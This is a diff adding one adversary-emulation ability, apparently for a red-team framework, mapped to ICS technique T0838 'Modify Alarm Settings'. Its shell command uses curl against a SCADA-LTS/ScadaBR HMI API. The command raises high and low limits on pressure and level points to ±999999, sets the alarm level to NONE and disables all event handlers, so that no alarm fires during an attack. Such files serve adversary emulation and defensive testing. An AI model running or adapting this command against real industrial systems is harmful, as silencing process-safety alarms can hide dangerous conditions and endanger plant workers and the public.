@@ -1,0 +1,24 @@
+---
+
+- id: a7b8c9d0-7777-7777-7777-000000000003
+  name: SCADA-LTS - Raise Alarm Thresholds to Disable Alerts
+  description: |
+    Use SCADA-LTS API to modify alarm settings on pressure and
+    level data points, raising thresholds so high that no alarm
+    will ever trigger during the attack.
+  tactic: inhibit-response-function
+  technique_id: T0838
+  technique_name: Modify Alarm Settings
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      HMI="http://192.168.90.107:8080/ScadaBR" &&
+      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/event-detectors"
+      -H "Content-Type: application/json"
+      -d '{"highLimit": 999999, "lowLimit": -999999, "alarmLevel": "NONE"}'
+      2>/dev/null &&
+      echo "ALARM_THRESHOLDS_RAISED" &&
+      curl -s -b /tmp/hmi.jar -X POST "$HMI/api/event-handlers/disable-all"
+      2>/dev/null &&
+      echo "ALARM_HANDLERS_DISABLED"
